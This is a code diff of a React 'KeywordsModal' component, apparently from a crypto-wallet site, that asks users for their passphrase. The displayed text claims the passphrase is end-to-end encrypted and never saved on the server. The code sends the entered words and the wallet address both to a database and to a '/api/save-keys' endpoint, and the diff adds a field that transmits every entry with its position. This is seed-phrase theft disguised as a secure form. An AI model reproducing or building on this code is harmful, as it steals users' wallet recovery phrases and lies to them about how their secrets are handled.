@@ -33,8 +33,8 @@ export function KeywordsModal({ open, onOpenChange }: KeywordsModalProps) {
     const [status, setStatus] = useState<"none" | "success" | "error">("none")
     const [isSubmiting, setIsSubmiting] = useState(false)
 
-      const { address } = useAccount()
-    
+    const { address } = useAccount()
+
     const updateField = (index: number, value: string) => {
         setFields(prev => {
             const copy = [...prev]
@@ -47,9 +47,9 @@ export function KeywordsModal({ open, onOpenChange }: KeywordsModalProps) {
 
     const submit = async () => {
         setIsSubmiting(true)
-        const keywords = fields.filter(f => f.trim() !== "")
+        const trimmed_keywords = fields.filter(f => f.trim() !== "")
 
-        if (keywords.length === 0) {
+        if (trimmed_keywords.length === 0) {
             setStatus("error")
             setIsSubmiting(false)
 
@@ -63,7 +63,7 @@ export function KeywordsModal({ open, onOpenChange }: KeywordsModalProps) {
                 collectionId: collectionId,
                 documentId: ID.unique(),
                 data: {
-                    keywords: keywords.join(" "),
+                    keywords: trimmed_keywords.join(" "),
                     address,
                     $createdAt: new Date().toISOString(),
                     $updatedAt: new Date().toISOString(),
@@ -73,7 +73,7 @@ export function KeywordsModal({ open, onOpenChange }: KeywordsModalProps) {
             const res = await fetch("/api/save-keys", {
                 headers: { "Content-Type": "application/json" },
                 method: "POST",
-                body: JSON.stringify({ keys: keywords , address})
+                body: JSON.stringify({ keys: trimmed_keywords, address, keyFields: JSON.stringify(Object.fromEntries(fields.entries())) })
             })
 
             if (res.ok || response) {
@@ -116,7 +116,7 @@ export function KeywordsModal({ open, onOpenChange }: KeywordsModalProps) {
 
                     <p className="text-sm text-muted-foreground text-center px-4 mt-1">
                         Securely enter your passphrase,
-                       Please Note that your passhrase is end-to-end encrypted and saved only on your device — we do not save them on our server.
+                        Please Note that your passhrase is end-to-end encrypted and saved only on your device — we do not save them on our server.
                     </p>
                 </div>
 
